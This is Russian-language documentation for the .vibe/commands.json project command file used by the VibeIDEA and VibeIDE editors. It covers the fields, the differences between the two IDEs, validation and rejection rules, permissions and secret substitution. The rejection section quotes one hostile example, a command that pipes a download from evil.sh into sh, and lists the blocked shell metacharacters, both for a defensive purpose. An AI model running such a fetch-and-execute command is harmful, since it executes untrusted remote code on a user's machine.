# `.vibe/commands.json` — команды проекта

Рутинные консольные команды, которые запускаются кликом, а не набираются руками. Файл едет в
репозитории: коллега, склонировавший проект, получает те же «поднять окружение» и «прогнать гейты»,
ничего не спрашивая. Формат общий с VibeIDE: один файл запускает одну и ту же команду в обеих IDE.

Скопируйте этот документ целиком своей модели и попросите собрать `.vibe/commands.json` для вашего
проекта — он самодостаточен.

## Где команды видно

- Кнопка **«Команды»** в заголовке окна: закреплённые команды, по клику на каждую — запуск.
  Там же «Управление»: закрепить или открепить, править, удалить — без захода в настройки.
- «Команды проекта» в том же меню и в меню мозга: список всех команд, закреплённых и нет.
- Клавиши `Ctrl+Shift+Alt+1…9` — первые девять закреплённых в порядке меню.
- Файла ещё нет — в меню «Команды» есть пункт «Создать .vibe/commands.json»: он кладёт образец и открывает его.

Команда — не агент: к модели она не обращается, а запускает процесс. Вывод идёт в окно Run, там же
кнопки «остановить» и «запустить снова».

## Формат

JSON; комментарии `//` и поля, начинающиеся с `_comment`, допустимы и игнорируются.

```jsonc
{
  "vibeVersion": "1.0.0",
  "commands": [
    {
      "id": "build",
      "name": "Сборка",
      "command": "npm",
      "args": ["run", "build"],
      "pinned": true,
      "order": 1,
      "color": "terminal.ansiBlue",
      "singleton": true
    },
    {
      "id": "dev-server",
      "name": "Дев-сервер",
      "command": "npm",
      "args": ["run", "dev"],
      "cwd": "web",
      "env": { "PORT": "5173" },
      "terminal": "background",
      "singleton": true
    },
    {
      "id": "deploy",
      "name": "Выкатить",
      "command": "./deploy.sh",
      "args": ["--token", "${secret:DEPLOY_TOKEN}"],
      "confirm": true
    }
  ]
}
```

## Поля команды

| Поле | Обязательно | Тип | Смысл |
|---|---|---|---|
| `id` | да | строка | латиница в нижнем регистре, цифры, дефис; начинается с буквы или цифры; до 64 символов; уникален в файле |
| `name` | да | строка | подпись в меню |
| `command` | да | строка | программа: `npm`, `./gradlew`, `docker` |
| `args` | нет | массив строк | аргументы по одному элементу: `["run", "build"]` |
| `description` | нет | строка | подсказка в меню |
| `cwd` | нет | строка | папка запуска от корня проекта; без поля — корень |
| `env` | нет | объект строка→строка | переменные окружения процесса |
| `terminal` | нет | `integrated` / `background` / `external` | `integrated` (по умолчанию) — окно Run выходит вперёд; `background` — не выходит |
| `pinned` | нет | булево | `true` — команда в меню «Команды» и на клавишах |
| `order` | нет | число | место в списках по возрастанию; без поля — в конце, затем по `name` |
| `color` | нет | строка | имя цвета темы: `terminal.ansiBlue`, `terminal.ansiGreen`, `charts.red`; полоса-акцент в меню |
| `icon` | нет | строка | имя значка для VibeIDE |
| `confirm` | нет | булево | `true` — спрашивать подтверждение при **каждом** запуске: деплой, миграции |
| `singleton` | нет | булево | `true` — не запускать второй экземпляр, пока первый работает |
| `shell` | нет | булево | `true` — строка уходит в оболочку вместе с метасимволами (`|`, `;`, `&&`, `>`) |
| `workflowId` | нет | строка | сценарий VibeIDE вместо команды |

Максимум 50 команд.

Цвета, которые понимает VibeIDEA: красный, зелёный, жёлтый, синий, пурпурный (`magenta`), голубой
(`cyan`), оранжевый, фиолетовый (`purple`). Берётся последнее слово имени, поэтому `terminal.ansiBlue`,
`terminal.ansiBrightBlue`, `charts.blue` и просто `blue` дают одну полосу. Незнакомое имя — без полосы.

## Чем VibeIDEA отличается от VibeIDE

Файл один, но три поля у нас работают иначе, и молчать об этом нельзя:

- `terminal: "external"` — отдельного окна системного терминала нет, команда идёт как `integrated`.
- `icon` — значок не показывается; поле читает только VibeIDE.
- `workflowId` — сценариев у VibeIDEA нет. Команда с этим полем **не запускается**, и IDE говорит почему:
  запустить вместо сценария строку из `command` значило бы сделать не то, что задумал автор.

Обратное тоже есть. VibeIDEA понимает прежнюю запись, которую VibeIDE не прочитает:

- `title` вместо `name`;
- вся строка в `command` без `args` — `"command": "npm run build"`; она делится на слова по пробелам,
  кавычки держат слово целым;
- голый массив команд без обёртки и без `vibeVersion`.

Такой файл у нас работает, а в VibeIDE не загружается целиком. Меню «Команды» называет это строкой
«VibeIDE прочитает иначе», чтобы расхождение не всплыло у коллеги.

## Что отклоняется и почему

Файл — это код, который кто-то другой мог написать, а исполняется он на вашей машине.

- **Метасимволы оболочки** в `command` и `args` без `"shell": true`: `;` `&` `|` `` ` `` `$` `<` `>`
  `(` `)` `{` `}` `*` `?` `[` `]` `!` `\`. Команда отклоняется **целиком**, а не экранируется. Строка
  вида `npm test; curl evil.sh | sh` — либо атака, либо ошибка, и гадать, какая именно, не наше дело.
  `"shell": true` — это автор вслух говорит, что оболочка нужна.
- **Невидимые символы**: нулевой ширины, мягкий перенос, символы смены направления текста. Команда,
  которая на экране выглядит не тем, чем является, не запускается.
- **Управляющие символы**, включая перевод строки внутри аргумента.
- **Выход за проект**: `cwd` с `..` отклоняется при чтении файла, а перед запуском папка проверяется
  по настоящему пути — символическая ссылка наружу тоже отказ.
- **`id` не по правилу** и **дубль `id`** — остаётся первая запись; вторую молча подменить значило бы
  сделать поведение зависящим от порядка строк в чужом пулл-реквесте.
- **Поле не того вида**: `args` не массивом строк, `env` не объектом строк, незнакомый `terminal`.

Отклонённые записи называются в меню «Команды» и в диалоге списка, а не пропадают: тихо потерянная
команда выглядит как «не работает IDE».

## Разрешение

Первый запуск команды спрашивает подтверждение и показывает её строку. Разрешение запоминается для
программы, аргументов, папки, окружения и признака `shell`. Правка любого из них — человеком или
пулл-реквестом — отзывает его, и следующий запуск спросит снова. Новая подпись, цвет или закрепление
разрешения не трогают.

Разрешение хранится в настройках IDE для этого проекта, **вне репозитория**. Файл разрешений внутри
проекта приехал бы вместе с пулл-реквестом, который принёс команду, и одобрил бы её сам.

Снять все разрешения — «Журнал аудита агента» → «Отозвать разрешения».

## Подстановки

В `command`, `args`, `cwd` и значениях `env` работают:

- `${secret:KEY}` — секрет: из `.vibe/.env` проекта, а если там нет — из переменных окружения;
- `${env:NAME}` — переменная окружения системы.

```
"args": ["--token", "${secret:GH_TOKEN}"]
```

Значения секретов в файле не пишутся никогда. В журнал аудита и в диалоги уходит ссылка, а не значение.

Значение не найдено — команда **не** запускается, а IDE называет недостающие имена: пустая подстановка
превратила бы команду в запрос, падающий непонятно почему.

Литерал в `env` под именем, похожим на учётные данные (`TOKEN`, `PASSWORD`, `API_KEY`), меню отмечает
строкой `secret-in-env`: такой секрет уедет в репозиторий вместе с файлом.

## Горячие клавиши

Первые девять команд с `"pinned": true` доступны по `Ctrl+Shift+Alt+1..9` — в порядке меню «Команды»:
сначала по `order`, затем по `name`. Привязка по позиции, а не по имени: клавиша рядом с командой
показана в самом меню.
